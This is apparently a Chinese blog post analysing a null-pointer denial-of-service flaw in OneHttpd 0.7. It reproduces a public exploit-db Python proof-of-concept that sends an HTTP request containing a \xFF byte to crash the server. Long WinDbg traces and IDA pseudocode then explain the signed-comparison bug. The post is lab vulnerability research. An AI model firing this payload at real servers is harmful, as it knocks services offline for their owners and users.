---
title: "OneHttpd_0.7空指针引用拒绝服务漏洞"
date: 2020-04-03T14:20:12+08:00
draft: false
---

# OneHttpd 0.7空指针引用拒绝服务漏洞

# 漏洞情况

WinXP Pro

Windbg

IDA

[OneHttpd 0.7](https://www.exploit-db.com/apps/c95b319ff6ad98fef110303302b1b535-onehttpd-0.7.exe)

https://www.exploit-db.com/exploits/27553

# 漏洞复现

```python
#!/usr/bin/env python
# Exploit Title: onehttpd 0.7 Denial of Service
# Date: 12 Aug 2013
# Exploit Author: superkojiman - http://www.techorganic.com
# Vendor Homepage: https://code.google.com/p/onehttpd/
# Version: onehttpd 0.7
# Tested on: Windows 7 Ultimate English
#            Windows XP SP2 English
#
from socket import *

buf =  ( 
b"GET /\xFF HTTP/1.1\r\n" + 
b"Host: 192.168.137.129\r\n" + 
b"\r\n"
)

s = socket(AF_INET, SOCK_STREAM)
s.connect(("192.168.137.129", 8080))
s.send(buf)
s.close()
```

崩溃如图

!https://s3-us-west-2.amazonaws.com/secure.notion-static.com/caaa72b2-5535-4a80-abe9-f7f13b0da658/Untitled.png

OS：拒绝服务攻击也是导致崩溃？或者是其中一种现象，能覆盖SEH链地址则为代码执行，不能则只能造成拒绝服务攻击

接着上WindDBG进行附加调试，按g之后运行Poc文件触发崩溃

```python
0:001> g
(d70.7d0): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
eax=00000000 ebx=003e49f8 ecx=00000000 edx=003e3818 esi=0000002a edi=00000000
eip=004015a4 esp=0020fc40 ebp=0020fc58 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010246
*** ERROR: Module load completed but symbols could not be loaded for C:\Vul\onehttpd.exe
onehttpd+0x15a4:
004015a4 8a07            mov     al,byte ptr [edi]          ds:0023:00000000=??
```

此处mov al,byte ptr [edi]将edi所指向的值赋给al(eax低位)，然后edi=00000000，由此造成了空指针引用

kb查看调用堆栈

```python
0:000> kb
ChildEBP RetAddr  Args to Child              
WARNING: Stack unwind information not available. Following frames may be wrong.
0020fc58 00404202 009d004c 003e3818 00000000 onehttpd+0x15a4
0020fc98 004045ce 003e49f8 00248db8 00000000 onehttpd+0x4202
0020fcd8 00404ae9 003e49f8 0020fcfc 0000002a onehttpd+0x45ce
0022ff28 00404d41 000007a0 003e3838 0022ff58 onehttpd+0x4ae9
0022ff58 004010a7 004012f0 00401066 0022ff78 onehttpd+0x4d41
0022ffa0 00401143 00000001 8061850d 7c92dc9c onehttpd+0x10a7
*** ERROR: Symbol file could not be found.  Defaulted to export symbols for C:\WINDOWS\system32\kernel32.dll - 
0022ffc0 7c817067 94af5a44 01d73bd1 7ffdf000 onehttpd+0x1143
0022fff0 00000000 00401130 00000000 78746341 kernel32!RegisterWaitForInputIdle+0x49
```

00404202为正在调用的函数的返回地址，我们用IDA查看一下

```python
.text:004041EC                 push    ecx             ; Size
.text:004041ED                 call    malloc
.text:004041F2                 add     esp, 0Ch
.text:004041F5                 mov     edi, eax
.text:004041F7                 push    0
.text:004041F9                 push    eax
.text:004041FA                 push    dword ptr [ebx+58h]
.text:004041FD                 call    sub_401581
.text:00404202                 add     esp, 10h
.text:00404205                 test    eax, eax
.text:00404 207                 jnz     loc_404348
.text:0040420D                 cmp     dword_40A008, 3
```

可以看到004041FD有运行了一个函数sub_401581，我们尝试跟进一下，用WinDBG在004041FD上下一个断点

```
0:001> bp 004041FD
0:001> g
Breakpoint 0 hit
eax=003e3818 ebx=003e49f8 ecx=00000000 edx=00020001 esi=0000002a edi=003e3818
eip=004041fd esp=0020fc60 ebp=0020fc98 iopl=0         nv up ei pl nz na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206
onehttpd+0x41fd:
004041fd e87fd3ffff      call    onehttpd+0x1581 (00401581)
0:000> t//跟进00401581这个函数
eax=003e3818 ebx=003e49f8 ecx=00000000 edx=00020001 esi=0000002a edi=003e3818
eip=00401581 esp=0020fc5c ebp=0020fc98 iopl=0         nv up ei pl nz na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206
onehttpd+0x1581:
00401581 55              push    ebp
0:000> p
eax=003e3818 ebx=003e49f8 ecx=00000000 edx=00020001 esi=0000002a edi=003e3818
eip=00401582 esp=0020fc58 ebp=0020fc98 iopl=0         nv up ei pl nz na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206
onehttpd+0x1582:
00401582 89e5            mov     ebp,esp
0:000> p
eax=003e3818 ebx=003e49f8 ecx=00000000 edx=00020001 esi=0000002a edi=003e3818
eip=00401584 esp=0020fc58 ebp=0020fc58 iopl=0         nv up ei pl nz na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206
onehttpd+0x1584:
00401584 57              push    edi
0:000> p
eax=003e3818 ebx=003e49f8 ecx=00000000 edx=00020001 esi=0000002a edi=003e3818
eip=00401585 esp=0020fc54 ebp=0020fc58 iopl=0         nv up ei pl nz na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206
onehttpd+0x1585:
00401585 56              push    esi
0:000> p
eax=003e3818 ebx=003e49f8 ecx=00000000 edx=00020001 esi=0000002a edi=003e3818
eip=00401586 esp=0020fc50 ebp=0020fc58 iopl=0         nv up ei pl nz na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206
onehttpd+0x1586:
00401586 53              push    ebx
0:000> p
eax=003e3818 ebx=003e49f8 ecx=00000000 edx=00020001 esi=0000002a edi=003e3818
eip=00401587 esp=0020fc4c ebp=0020fc58 iopl=0         nv up ei pl nz na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206
onehttpd+0x1587:
00401587 83ec0c          sub     esp,0Ch
0:000> p
eax=003e3818 ebx=003e49f8 ecx=00000000 edx=00020001 esi=0000002a edi=003e3818
eip=0040158a esp=0020fc40 ebp=0020fc58 iopl=0         nv up ei pl nz na po nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202
onehttpd+0x158a:
0040158a 8b450c          mov     eax,dword ptr [ebp+0Ch] ss:0023:0020fc64=003e3818
0:000> p
eax=003e3818 ebx=003e49f8 ecx=00000000 edx=00020001 esi=0000002a edi=003e3818
eip=0040158d esp=0020fc40 ebp=0020fc58 iopl=0         nv up ei pl nz na po nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202
onehttpd+0x158d:
0040158d 8b7d08          mov     edi,dword ptr [ebp+8] ss:0023:0020fc60=009d004c//将[ebp+8]所指向的值（009d004c）赋给edi 而009d004c由上可知为paylaod存储地址
0:000> p
eax=003e3818 ebx=003e49f8 ecx=00000000 edx=00020001 esi=0000002a edi=009d004c
eip=00401590 esp=0020fc40 ebp=0020fc58 iopl=0         nv up ei pl nz na po nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202
onehttpd+0x1590:
00401590 8945f0          mov     dword ptr [ebp-10h],eax ss:0023:0020fc48=0020fc58
0:000> p
eax=003e3818 ebx=003e49f8 ecx=00000000 edx=00020001 esi=0000002a edi=009d004c
eip=00401593 esp=0020fc40 ebp=0020fc58 iopl=0         nv up ei pl nz na po nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202
onehttpd+0x1593:
00401593 e9e8000000      jmp     onehttpd+0x1680 (00401680)
0:000> p
eax=003e3818 ebx=003e49f8 ecx=00000000 edx=00020001 esi=0000002a edi=009d004c
eip=00401680 esp=0020fc40 ebp=0020fc58 iopl=0         nv up ei pl nz na po nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202
onehttpd+0x1680:
00401680 8a07            mov     al,byte ptr [edi]          ds:0023:009d004c=2f//将[edi]所指向的值(2f)赋值给eax的低位al
0:000> p
eax=003e382f ebx=003e49f8 ecx=00000000 edx=00020001 esi=0000002a edi=009d004c
eip=00401682 esp=0020fc40 ebp=0020fc58 iopl=0         nv up ei pl nz na po nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202
onehttpd+0x1682:
00401682 84c0            test    al,al//判断al是否为0，此处不为0
0:000> p
eax=003e382f ebx=003e49f8 ecx=00000000 edx=00020001 esi=0000002a edi=009d004c
eip=00401684 esp=0020fc40 ebp=0020fc58 iopl=0         nv up ei pl nz na po nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202
onehttpd+0x1684:
00401684 0f850effffff    jne     onehttpd+0x1598 (00401598)              [br=1]//因上一条结果不为0，所以此处不跳转
0:000> p
eax=003e382f ebx=003e49f8 ecx=00000000 edx=00020001 esi=0000002a edi=009d004c
eip=00401598 esp=0020fc40 ebp=0020fc58 iopl=0         nv up ei pl nz na po nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202
onehttpd+0x1598:
00401598 3c1f            cmp     al,1Fh
0:000> p
eax=003e382f ebx=003e49f8 ecx=00000000 edx=00020001 esi=0000002a edi=009d004c
eip=0040159a esp=0020fc40 ebp=0020fc58 iopl=0         nv up ei pl nz na po nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202
onehttpd+0x159a:
0040159a 0f9fc0          setg    al//当上面al>1Fh时，al就会被置1，否则置0
0:000> p
eax=003e3801 ebx=003e49f8 ecx=00000000 edx=00020001 esi=0000002a edi=009d004c
eip=0040159d esp=0020fc40 ebp=0020fc58 iopl=0         nv up ei pl nz na po nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202
onehttpd+0x159d:
0040159d 0fb6c0          movzx   eax,al//取eax的低8位01,其余位置0，即0000000001
0:000> p
eax=00000001 ebx=003e49f8 ecx=00000000 edx=00020001 esi=0000002a edi=009d004c
eip=004015a0 esp=0020fc40 ebp=0020fc58 iopl=0         nv up ei pl nz na po nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202
onehttpd+0x15a0:
004015a0 f7d8            neg     eax//eax求补（注意与求补码区别），取反加一
0:000> p
eax=ffffffff ebx=003e49f8 ecx=00000000 edx=00020001 esi=0000002a edi=009d004c
eip=004015a2 esp=0020fc40 ebp=0020fc58 iopl=0         nv up ei ng nz ac pe cy
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000297
onehttpd+0x15a2:
004015a2 21c7            and     edi,eax//edi与eax相与，结果保存到edi
0:000> p
eax=ffffffff ebx=003e49f8 ecx=00000000 edx=00020001 esi=0000002a edi=009d004c
eip=004015a4 esp=0020fc40 ebp=0020fc58 iopl=0         nv up ei pl nz na po nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202
onehttpd+0x15a4:
004015a4 8a07            mov     al,byte ptr [edi]          ds:0023:009d004c=2f
0:000> p
eax=ffffff2f ebx=003e49f8 ecx=00000000 edx=00020001 esi=0000002a edi=009d004c
eip=004015a6 esp=0020fc40 ebp=0020fc58 iopl=0         nv up ei pl nz na po nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202
onehttpd+0x15a6:
004015a6 0fbed0          movsx   edx,al//al(2f 0010 1111)首位为0，则edx高8位全置为0，结果为0000 0000 0010 1111
0:000> p
eax=ffffff2f ebx=003e49f8 ecx=00000000 edx=0000002f esi=0000002a edi=009d004c
eip=004015a9 esp=0020fc40 ebp=0020fc58 iopl=0         nv up ei pl nz na po nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202
onehttpd+0x15a9:
004015a9 3c23            cmp     al,23h
0:000> p
eax=ffffff2f ebx=003e49f8 ecx=00000000 edx=0000002f esi=0000002a edi=009d004c
eip=004015ab esp=0020fc40 ebp=0020fc58 iopl=0         nv up ei pl nz na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206
onehttpd+0x15ab:
004015ab 7f12            jg      onehttpd+0x15bf (004015bf)              [br=1]
0:000> p
eax=ffffff2f ebx=003e49f8 ecx=00000000 edx=0000002f esi=0000002a edi=009d004c
eip=004015bf esp=0020fc40 ebp=0020fc58 iopl=0         nv up ei pl nz na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206
onehttpd+0x15bf:
004015bf 3c3c            cmp     al,3Ch
0:000> p
eax=ffffff2f ebx=003e49f8 ecx=00000000 edx=0000002f esi=0000002a edi=009d004c
eip=004015c1 esp=0020fc40 ebp=0020fc58 iopl=0         nv up ei ng nz na pe cy
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000287
onehttpd+0x15c1:
004015c1 740e            je      onehttpd+0x15d1 (004015d1)              [br=0]
0:000> p
eax=ffffff2f ebx=003e49f8 ecx=00000000 edx=0000002f esi=0000002a edi=009d004c
eip=004015c3 esp=0020fc40 ebp=0020fc58 iopl=0         nv up ei ng nz na pe cy
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000287
onehttpd+0x15c3:
004015c3 3c3e            cmp     al,3Eh
0:000> p
eax=ffffff2f ebx=003e49f8 ecx=00000000 edx=0000002f esi=0000002a edi=009d004c
eip=004015c5 esp=0020fc40 ebp=0020fc58 iopl=0         nv up ei ng nz na po cy
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000283
onehttpd+0x15c5:
004015c5 740a            je      onehttpd+0x15d1 (004015d1)              [br=0]
0:000> p
eax=ffffff2f ebx=003e49f8 ecx=00000000 edx=0000002f esi=0000002a edi=009d004c
eip=004015c7 esp=0020fc40 ebp=0020fc58 iopl=0         nv up ei ng nz na po cy
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000283
onehttpd+0x15c7:
004015c7 3c25            cmp     al,25h
0:000> p
eax=ffffff2f ebx=003e49f8 ecx=00000000 edx=0000002f esi=0000002a edi=009d004c
eip=004015c9 esp=0020fc40 ebp=0020fc58 iopl=0         nv up ei pl nz na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206
onehttpd+0x15c9:
004015c9 0f85a8000000    jne     onehttpd+0x1677 (00401677)              [br=1]
0:000> p
eax=ffffff2f ebx=003e49f8 ecx=00000000 edx=0000002f esi=0000002a edi=009d004c
eip=00401677 esp=0020fc40 ebp=0020fc58 iopl=0         nv up ei pl nz na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206
onehttpd+0x1677:
00401677 8b55f0          mov     edx,dword ptr [ebp-10h] ss:0023:0020fc48=003e3818
0:000> p
eax=ffffff2f ebx=003e49f8 ecx=00000000 edx=003e3818 esi=0000002a edi=009d004c
eip=0040167a esp=0020fc40 ebp=0020fc58 iopl=0         nv up ei pl nz na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206
onehttpd+0x167a:
0040167a 8802            mov     byte ptr [edx],al          ds:0023:003e3818=00
0:000> p
eax=ffffff2f ebx=003e49f8 ecx=00000000 edx=003e3818 esi=0000002a edi=009d004c
eip=0040167c esp=0020fc40 ebp=0020fc58 iopl=0         nv up ei pl nz na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206
onehttpd+0x167c:
0040167c ff45f0          inc     dword ptr [ebp-10h]  ss:0023:0020fc48=003e3818
0:000> p
eax=ffffff2f ebx=003e49f8 ecx=00000000 edx=003e3818 esi=0000002a edi=009d004c
eip=0040167f esp=0020fc40 ebp=0020fc58 iopl=0         nv up ei pl nz na po nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202
onehttpd+0x167f:
0040167f 47              inc     edi
0:000> p
eax=ffffff2f ebx=003e49f8 ecx=00000000 edx=003e3818 esi=0000002a edi=009d004d
eip=00401680 esp=0020fc40 ebp=0020fc58 iopl=0         nv up ei pl nz na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206
onehttpd+0x1680:
00401680 8a07            mov     al,byte ptr [edi]          ds:0023:009d004d=ff
0:000> p
eax=ffffffff ebx=003e49f8 ecx=00000000 edx=003e3818 esi=0000002a edi=009d004d
eip=00401682 esp=0020fc40 ebp=0020fc58 iopl=0         nv up ei pl nz na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206
onehttpd+0x1682:
00401682 84c0            test    al,al
0:000> p
eax=ffffffff ebx=003e49f8 ecx=00000000 edx=003e3818 esi=0000002a edi=009d004d
eip=00401684 esp=0020fc40 ebp=0020fc58 iopl=0         nv up ei ng nz na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000286
onehttpd+0x1684:
00401684 0f850effffff    jne     onehttpd+0x1598 (00401598)              [br=1]
0:000> p
eax=ffffffff ebx=003e49f8 ecx=00000000 edx=003e3818 esi=0000002a edi=009d004d
eip=00401598 esp=0020fc40 ebp=0020fc58 iopl=0         nv up ei ng nz na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000286
onehttpd+0x1598:
00401598 3c1f            cmp     al,1Fh//漏洞正是因为此处al与1Fh的cmp指令操作
0:000> p
eax=ffffffff ebx=003e49f8 ecx=00000000 edx=003e3818 esi=0000002a edi=009d004d
eip=0040159a esp=0020fc40 ebp=0020fc58 iopl=0         nv up ei ng nz na po nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000282
onehttpd+0x159a:
0040159a 0f9fc0          setg    al//al大于1Fh时，al为1则正常，否则al为0，就会造成下面一系列问题，此处ff为负数小于1Fh
0:000> p                           
eax=ffffff00 ebx=003e49f8 ecx=00000000 edx=003e3818 esi=0000002a edi=009d004d
eip=0040159d esp=0020fc40 ebp=0020fc58 iopl=0         nv up ei ng nz na po nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000282
onehttpd+0x159d:
0040159d 0fb6c0          movzx   eax,al
0:000> p
eax=00000000 ebx=003e49f8 ecx=00000000 edx=003e3818 esi=0000002a edi=009d004d
eip=004015a0 esp=0020fc40 ebp=0020fc58 iopl=0         nv up ei ng nz na po nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000282
onehttpd+0x15a0:
004015a0 f7d8            neg     eax
0:000> p
eax=00000000 ebx=003e49f8 ecx=00000000 edx=003e3818 esi=0000002a edi=009d004d
eip=004015a2 esp=0020fc40 ebp=0020fc58 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
onehttpd+0x15a2:
004015a2 21c7            and     edi,eax
0:000> p
eax=00000000 ebx=003e49f8 ecx=00000000 edx=003e3818 esi=0000002a edi=00000000
eip=004015a4 esp=0020fc40 ebp=0020fc58 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
onehttpd+0x15a4:
004015a4 8a07            mov     al,byte ptr [edi]          ds:0023:00000000=??
```

PS：注意NEG指令与求补码的区别

我们利用IDA的F5功能看一下上面汇编的伪代码

```c
signed int __cdecl sub_401581(_BYTE *a1, _BYTE *a2)
{
  int v2; // ecx@0
  _BYTE *v3; // edi@1
  _BYTE *v4; // edi@2
  char v5; // al@2
  char v7; // dl@13
  char v8; // si@17
  char v9; // al@17
  int v10; // ebx@21
  _BYTE *v11; // [sp+Ch] [bp-10h]@1

  v3 = a1;
  v11 = a2;
  while ( 1 )
  {
    if ( !*v3 )
    {
      *v11 = 0;
      return 0;
    }
    v4 = (_BYTE *)(*v3 > 31 ? (unsigned int)v3 : 0);
    v5 = *v4;
    if ( *v4 <= 35 )
    {
      if ( v5 >= 34 || !v5 || v5 == 32 )
        break;
}
```

我们Payload中的\xFF由于是一个负数，所以一定小于31，最后造成了空指针引用